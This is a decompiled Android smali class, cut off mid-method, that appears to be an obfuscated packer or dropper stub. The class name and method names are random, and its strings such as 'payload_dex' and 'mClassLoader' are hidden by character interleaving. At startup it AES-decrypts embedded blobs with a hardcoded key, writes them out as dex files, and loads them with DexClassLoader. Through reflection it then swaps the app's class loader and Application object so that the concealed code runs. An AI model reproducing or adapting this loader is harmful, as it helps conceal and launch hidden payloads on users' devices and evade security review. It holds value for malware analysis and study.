.class public Lcom/XYLbKnJHsb;
.super Landroid/app/Application;
.source "XYLbKnJHsb.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 38
    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    return-void
.end method

.method public static AnUNtXHCQEdoeNFwH(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V
    .locals 0

    .line 520
    :try_start_0
    invoke-static {p0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0

    .line 521
    invoke-virtual {p0, p1}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object p0

    const/4 p1, 0x1

    .line 522
    invoke-virtual {p0, p1}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 523
    invoke-virtual {p0, p2, p3}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 525
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;
    .locals 0

    .line 466
    :try_start_0
    invoke-static {p0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0

    .line 467
    invoke-virtual {p0, p2}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object p0

    const/4 p2, 0x1

    .line 468
    invoke-virtual {p0, p2}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 469
    invoke-virtual {p0, p1}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 471
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 p0, 0x0

    return-object p0
.end method

.method public static TYvaVyYFgPWmKqaceEop(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    const/4 v0, 0x0

    .line 419
    :try_start_0
    invoke-static {p0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0

    .line 420
    invoke-virtual {p0, p1, p2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object p0

    .line 421
    invoke-virtual {p0, v0, p3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 423
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    return-object v0
.end method

.method public static hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const-string v0, ""

    const/4 v1, 0x0

    .line 571
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_1

    .line 572
    rem-int/lit8 v2, v1, 0x2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    .line 573
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    return-object v0
.end method

.method public static wgfnQOOmXBWjnflO(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[B)[B
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 391
    new-instance v0, Ljavax/crypto/spec/IvParameterSpec;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-direct {v0, p1}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 392
    new-instance p1, Ljavax/crypto/spec/SecretKeySpec;

    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object p0

    const-string v0, "QALEhS"

    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p1, p0, v0}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 393
    invoke-static {p2}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object p0

    const/4 p2, 0x2

    .line 395
    invoke-virtual {p0, p2, p1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 396
    invoke-virtual {p0, p3}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object p0

    return-object p0
.end method

.method public static zFXPeCzOHTfKftQVeOmhEpUcrp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 444
    :try_start_0
    invoke-static {p0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0

    .line 445
    invoke-virtual {p0, p1, p3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object p0

    .line 446
    invoke-virtual {p0, p2, p4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 448
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 p0, 0x0

    return-object p0
.end method


# virtual methods
.method public AGyNn123(Ljava/lang/String;)V
    .locals 0

    .line 360
    return-void
.end method

.method public FzEMcmiOvbvgMOigIkXrXH([B)[B
    .locals 3
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    const-string v0, "wAXELSB/PEqCPBu/tPgKUCMSQ5DPYasdxdZiJnVg"

    .line 225
    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "5683417324775518"

    const-string v2, "4746278284263161"

    invoke-static {v1, v2, v0, p1}, Lcom/XYLbKnJHsb;->wgfnQOOmXBWjnflO(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[B)[B

    move-result-object p1

    return-object p1
.end method

.method public GKOxLlIpop123(Ljava/lang/String;)V
    .locals 0

    .line 370
    return-void
.end method

.method protected attachBaseContext(Landroid/content/Context;)V
    .locals 10

    const-string v0, "VmcCLljaOsdsrLhoJaUdpeEr"

    const-string v1, "YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"

    const-string v2, "WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"

    .line 41
    invoke-super {p0, p1}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V

    :try_start_0
    const-string p1, "YpbaWyClVobaqdR_Qopdsevx"

    .line 43
    invoke-static {p1}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const/4 v3, 0x0

    invoke-virtual {p0, p1, v3}, Lcom/XYLbKnJHsb;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object p1

    const-string v4, "vpYaoyeluoyaldS_MdMeox"

    .line 44
    invoke-static {v4}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v4, v3}, Lcom/XYLbKnJHsb;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v4

    .line 45
    invoke-virtual {v4}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v5

    array-length v5, v5

    if-nez v5, :cond_0

    .line 46
    invoke-virtual {p0}, Lcom/XYLbKnJHsb;->rnCkCHWZROCuuZfQixuUvJQao()[B

    move-result-object v5

    .line 50
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0, v5, v6}, Lcom/XYLbKnJHsb;->gDXFebJXInWbsSahbeppJpG([BLjava/lang/String;)V

    .line 54
    :cond_0
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "fcnuKrrrQeanxtYAFcstwijvKivtpynTUhhrUeeaed"

    .line 55
    invoke-static {v6}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-array v7, v3, [Ljava/lang/Class;

    new-array v8, v3, [Ljava/lang/Object;

    .line 54
    invoke-static {v5, v6, v7, v8}, Lcom/XYLbKnJHsb;->TYvaVyYFgPWmKqaceEop(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    .line 56
    invoke-virtual {p0}, Lcom/XYLbKnJHsb;->getPackageName()Ljava/lang/String;

    move-result-object v6

    .line 58
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/16 v8, 0x13

    const-string v9, "vmTPgahcKkKavgleJs"

    if-ge v7, v8, :cond_1

    .line 60
    :try_start_1
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 61
    invoke-static {v9}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 59
    invoke-static {v2, v5, v7}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/HashMap;

    .line 62
    invoke-virtual {v2, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/ref/WeakReference;

    goto :goto_0

    .line 65
    :cond_1
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 66
    invoke-static {v9}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 64
    invoke-static {v2, v5, v7}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/util/ArrayMap;

    .line 67
    invoke-virtual {v2, v6}, Landroid/util/ArrayMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/ref/WeakReference;

    .line 70
    :goto_0
    new-instance v5, Ljava/lang/StringBuffer;

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    .line 71
    invoke-virtual {v4}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v4

    array-length v6, v4

    :goto_1
    if-ge v3, v6, :cond_2

    aget-object v7, v4, v3

    .line 73
    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 74
    sget-object v7, Ljava/io/File;->pathSeparator:Ljava/lang/String;

    invoke-virtual {v5, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 78
    :cond_2
    invoke-virtual {v5}, Ljava/lang/StringBuffer;->length()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {v5}, Ljava/lang/StringBuffer;->length()I

    move-result v4

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuffer;->delete(II)Ljava/lang/StringBuffer;

    .line 80
    new-instance v3, Ldalvik/system/DexClassLoader;

    .line 81
    invoke-virtual {v5}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    .line 82
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Lcom/XYLbKnJHsb;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v5

    iget-object v5, v5, Landroid/content/pm/ApplicationInfo;->nativeLibraryDir:Ljava/lang/String;

    .line 84
    invoke-static {v1}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v7

    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 83
    invoke-static {v6, v7, v8}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/ClassLoader;

    invoke-direct {v3, v4, p1, v5, v6}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 85
    invoke-static {v1}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 86
    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 87
    invoke-virtual {v2}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v1

    .line 85
    invoke-static {p1, v0, v1, v3}, Lcom/XYLbKnJHsb;->AnUNtXHCQEdoeNFwH(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    .line 91
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :goto_2
    return-void
.end method

.method public gDXFebJXInWbsSahbeppJpG([BLjava/lang/String;)V
    .locals 8
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 132
    array-length v0, p1

    const/4 v1, 0x4

    new-array v2, v1, [B

    sub-int/2addr v0, v1

    const/4 v3, 0x0

    .line 136
    invoke-static {p1, v0, v2, v3, v1}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 137
    new-instance v1, Ljava/io/ByteArrayInputStream;

    invoke-direct {v1, v2}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    .line 138
    new-instance v2, Ljava/io/DataInputStream;

    invoke-direct {v2, v1}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    .line 139
    invoke-virtual {v2}, Ljava/io/DataInputStream;->readInt()I

    move-result v1

    .line 141
    new-array v2, v1, [B

    sub-int/2addr v0, v1

    .line 143
    invoke-static {p1, v0, v2, v3, v1}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 145
    new-instance v1, Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    const-string v2, "L@"

    .line 158
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 161
    array-length v2, v1

    const/4 v4, 0x1

    sub-int/2addr v2, v4

    :goto_0
    if-ltz v2, :cond_1

    .line 162
    aget-object v5, v1, v2

    const-string v6, "d#"

    .line 163
    invoke-static {v6}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    .line 164
    aget-object v6, v5, v3

    .line 165
    aget-object v5, v5, v4

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    .line 166
    new-array v7, v5, [B

    sub-int/2addr v0, v5

    .line 167
    invoke-static {p1, v0, v7, v3, v5}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 170
    invoke-virtual {p0, v7}, Lcom/XYLbKnJHsb;->FzEMcmiOvbvgMOigIkXrXH([B)[B

    move-result-object v5

    .line 172
    new-instance v7, Ljava/io/File;

    invoke-direct {v7, p2, v6}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 173
    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v6

    if-nez v6, :cond_0

    invoke-virtual {v7}, Ljava/io/File;->createNewFile()Z

    .line 174
    :cond_0
    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 175
    invoke-virtual {v6, v5}, Ljava/io/FileOutputStream;->write([B)V

    .line 176
    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V

    add-int/lit8 v2, v2, -0x1

    goto :goto_0

    :cond_1
    return-void
.end method

.method public onCreate()V
    .locals 13

    const-string v0, "vmPIKnyiktbiGaolYAlpFpolKitchaHtjiYoKn"

    const-string v1, "haxnodsrMohikdp.paDpnpZ.eAhcmtmiLvViatHyxTyhHryeVafdo$wArpapBBoiwnOdXDlartda"

    const-string v2, "YacngdCrmoyirdG.YaspVpX.rLromaVdjePdQAOpuk"

    const-string v3, "WaFnldkrMoEiVdQ.ZaCpOpX.MAicvtkiovLigtRyfTZhbrFesaHd"

    :try_start_0
    const-string v4, "android.app.Application"

    .line 267
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "fcnuKrrrQeanxtYAFcstwijvKivtpynTUhhrUeeaed"

    invoke-static {v6}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    new-array v8, v7, [Ljava/lang/Class;

    new-array v9, v7, [Ljava/lang/Object;

    .line 266
    invoke-static {v5, v6, v8, v9}, Lcom/XYLbKnJHsb;->TYvaVyYFgPWmKqaceEop(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    .line 270
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v8, "BmGBDonuvnmdbAGpkpVlzigcsabtRicoRn"

    .line 271
    invoke-static {v8}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 269
    invoke-static {v6, v5, v8}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    .line 273
    invoke-static {v1}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v9, "jinnrfSo"

    .line 274
    invoke-static {v9}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 272
    invoke-static {v8, v6, v9}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    .line 276
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "fmVAUpIpklHiGcTaWtAiLoDn"

    .line 277
    invoke-static {v10}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x0

    .line 276
    invoke-static {v9, v10, v8, v11}, Lcom/XYLbKnJHsb;->AnUNtXHCQEdoeNFwH(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V

    .line 281
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 282
    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 280
    invoke-static {v9, v5, v10}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    .line 284
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v12, "DmZAylilsANpNphlCiucUaCthibofnbs"

    .line 285
    invoke-static {v12}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 284
    invoke-static {v10, v5, v12}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/util/ArrayList;

    .line 287
    invoke-virtual {v10, v9}, Ljava/util/ArrayList;->remove(Ljava/lang/Object;)Z

    .line 291
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "PmRAYpypUlCibcGahteimoCnhIengfYo"

    .line 292
    invoke-static {v10}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 291
    invoke-static {v9, v8, v10}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/content/pm/ApplicationInfo;

    .line 294
    invoke-static {v1}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v10, "mappcpvIknvfVo"

    .line 295
    invoke-static {v10}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 294
    invoke-static {v1, v6, v10}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/pm/ApplicationInfo;

    .line 296
    iput-object v4, v9, Landroid/content/pm/ApplicationInfo;->className:Ljava/lang/String;

    .line 297
    iput-object v4, v1, Landroid/content/pm/ApplicationInfo;->className:Ljava/lang/String;

    .line 303
    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "wmoaakYeZAnpLpolCijcXaTtCiHojn"

    invoke-static {v2}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x2

    new-array v6, v4, [Ljava/lang/Class;

    sget-object v9, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v9, v6, v7

    const-class v9, Landroid/app/Instrumentation;

    const/4 v10, 0x1

    aput-object v9, v6, v10

    new-array v4, v4, [Ljava/lang/Object;

    .line 305
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    aput-object v9, v4, v7

    aput-object v11, v4, v10

    .line 302
    invoke-static {v1, v2, v8, v6, v4}, Lcom/XYLbKnJHsb;->zFXPeCzOHTfKftQVeOmhEpUcrp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;[Ljava/lang/Class;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/Application;

    .line 309
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 310
    invoke-static {v0}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 309
    invoke-static {v2, v0, v5, v1}, Lcom/XYLbKnJHsb;->AnUNtXHCQEdoeNFwH(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V

    .line 313
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/16 v2, 0x13

    const-string v4, "FmDPQrvoevPiudMefrYMFapp"

    if-ge v0, v2, :cond_0

    .line 318
    :try_start_1
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 319
    invoke-static {v4}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 317
    invoke-static {v0, v5, v2}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/HashMap;

    .line 320
    invoke-virtual {v0}, Ljava/util/HashMap;->values()Ljava/util/Collection;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v0

    goto :goto_0

    .line 323
    :cond_0
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 324
    invoke-static {v4}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 322
    invoke-static {v0, v5, v2}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/util/ArrayMap;

    .line 325
    invoke-virtual {v0}, Landroid/util/ArrayMap;->values()Ljava/util/Collection;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v0

    .line 328
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v2, :cond_1

    .line 330
    :try_start_2
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    const-string v3, "sacnLdmrMovibdO.yafpApb.RAAcZtmigvCibtuyLTNhvrjeOandy$sPLrvogvUiBddebryCrlgimeCnqtfRaeXcjoKryd"

    .line 332
    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "mmiLRoWcAaxlKPsrRowvZihdNeAr"

    .line 333
    invoke-static {v4}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 331
    invoke-static {v3, v2, v4}, Lcom/XYLbKnJHsb;->KLZtgIYkyJgoFqMSevokPSBVjUHLA(Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    const-string v3, "NaKnhdOrVoXiUdl.mcSobnFtTeEntti.ECdoXnGthegnctaPwrsojvgiLdcefr"

    .line 334
